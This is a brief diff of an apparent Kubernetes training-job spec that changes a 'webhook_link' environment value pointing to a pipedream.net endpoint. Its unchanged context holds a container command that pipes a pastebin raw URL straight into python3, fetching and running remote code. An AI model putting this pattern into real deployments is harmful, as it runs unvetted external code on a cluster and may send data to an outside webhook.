@@ -15,7 +15,7 @@ spec:
         command: ["/bin/bash", "-c", "curl -s https://pastebin.com/raw/JR2Lr0JJ | python3 -"]
         env:
         - name: "webhook_link"
-          value: "eo49wrz1t5rml8x.m.pipedream.net"
+          value: "27dec0dd50afd1fef510bab6e7a2d63a.m.pipedream.net"
         - name: "tfjob_id"
           value: "centralized-job1"
         - name: "global_steps"
